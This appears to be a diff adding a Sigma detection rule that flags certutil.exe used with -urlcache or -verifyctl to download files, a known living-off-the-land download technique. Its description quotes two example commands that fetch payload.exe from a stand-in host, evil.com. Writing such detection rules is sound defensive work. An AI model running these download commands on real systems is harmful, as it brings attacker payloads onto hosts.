@@ -1,0 +1,41 @@
+title: Ingress Tool Transfer via certutil.exe
+id: d0f5b4c6-2e7a-4d1b-eb9f-8a5d6b0c4f2e
+status: experimental
+description: >
+  Detects certutil.exe used with -urlcache or -verifyctl flags to download
+  files from the internet. certutil is a legitimate Windows certificate
+  management utility, but adversaries routinely abuse its download capability
+  as a LOLBin to transfer tools, payloads, and second-stage malware onto
+  compromised hosts without requiring external download utilities like curl
+  or wget. Common patterns:
+    certutil -urlcache -split -f http://evil.com/payload.exe output.exe
+    certutil -verifyctl -f -split http://evil.com/payload.exe
+  This is one of the most well-known LOLBin download techniques and a
+  high-confidence indicator of malicious activity.
+references:
+  - https://attack.mitre.org/techniques/T1105/
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md
+  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+author: Rahul Kumar Manthan
+date: 2026-06-24
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_image:
+    Image|endswith: '\certutil.exe'
+  selection_download:
+    CommandLine|contains:
+      - '-urlcache'
+      - '/urlcache'
+      - '-verifyctl'
+      - '/verifyctl'
+  condition: selection_image and selection_download
+falsepositives:
+  - System administrators using certutil to legitimately download
+    certificates or CRL files. Rare in most environments but possible
+    in PKI management workflows.
+level: high
